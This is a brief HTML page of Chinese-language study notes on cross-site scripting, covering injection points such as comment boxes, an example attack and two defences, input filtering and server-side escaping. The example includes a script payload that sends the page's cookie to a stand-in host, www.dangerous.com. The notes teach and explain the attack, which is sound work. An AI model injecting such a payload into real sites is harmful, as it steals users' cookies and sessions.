<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
</head>

<body>
  <section>
    <h2>xss</h2>
    <div>cross site scripting 跨站点脚本攻击, 为了不和css重名，所以叫为xss</div>

    <h2>场景原理</h2>
    <ul>
      <li>不需要用户登录，不需要请求接口，也就不需要接口漏洞了</li>
      <li>条件是：找到漏洞来注入脚本, 一般是网站可以输入的代码的地方
        <ul>
          <li>input textarea 输入框，也就是搜索查询，评论等等</li>
          <li>浏览器地址栏</li>
        </ul>
      </li>
      <li>场景：评论框
        <ul>
          <li>用户输入一段脚本 new Image().src="www.dangerous.com/xxx", 当然这边要用script包起来</li>
          <li>然后用户点击提交，前端没有对这个段文字做过滤标签处理</li>
          <li>如果这个页面是这么处理的:  $('#container').html('那段script代码')</li>
          <li>这个时候 浏览器就执行了 用户不想执行的脚本，把当前源下的cookie发送给了 危险的网站</li>
        </ul>
      </li>
    </ul>

    <h2>防御措施</h2>
    <ul>
      <li>过滤输入的文字</li>
      <li>服务端转义</li>
    </ul>
  </section>
</body>

</html>